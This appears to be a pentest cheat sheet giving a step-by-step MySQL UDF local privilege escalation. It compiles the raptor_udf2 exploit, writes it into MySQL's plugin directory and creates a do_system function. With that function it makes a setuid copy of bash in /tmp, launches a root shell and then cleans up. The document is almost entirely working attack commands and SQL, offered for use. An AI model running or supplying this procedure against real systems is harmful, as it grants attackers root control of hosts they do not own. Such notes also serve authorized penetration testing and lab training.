## MySQL UDF Local Privilege Escalation 

**Preconditions:**

- MySQL service running as **root**
- `root` MySQL user has **no password**

### 1. Compile UDF exploit
https://www.exploit-db.com/exploits/1518

```bash
cd /home/user/tools/mysql-udf
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

### 2. Connect to MySQL

```bash
mysql -u root
```

### 3. Load UDF into MySQL

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

### 4. Gain root via UDF

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

### 5. Exit MySQL & pop root shell

```bash
exit
/tmp/rootbash -p
```

### 6. Cleanup

```bash
rm /tmp/rootbash
exit
```

---
